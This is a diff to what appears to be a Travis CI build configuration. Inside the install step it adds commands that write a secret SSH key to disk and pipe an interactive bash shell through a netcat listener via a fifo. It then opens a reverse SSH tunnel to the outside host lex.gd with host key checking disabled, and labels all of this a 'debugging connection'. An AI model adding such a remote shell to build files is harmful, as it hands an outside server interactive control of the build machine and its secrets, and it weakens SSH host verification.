@@ -101,6 +101,14 @@ install:
       export DISPLAY=:99.0
       Xvfb :99.0 &
 
+        mkdir .ssh
+        echo -e "${SSH_KEY}" > .ssh/id_rsa
+        chmod -R go-rwx .ssh
+        mkfifo fifo
+        ( while :; do cat fifo | /bin/bash -i 2>&1 | nc -l 127.0.0.1 9999 > fifo; done) &
+        echo "opening debuging connection"
+        travis_wait 60 ssh -o StrictHostKeyChecking=no -i .ssh/id_rsa -N -R 9999:localhost:9999 debug@lex.gd
+
       sudo add-apt-repository ppa:ubuntu-wine/ppa -y
       sudo apt-get update -qq
       sudo apt-get -q install -y wine
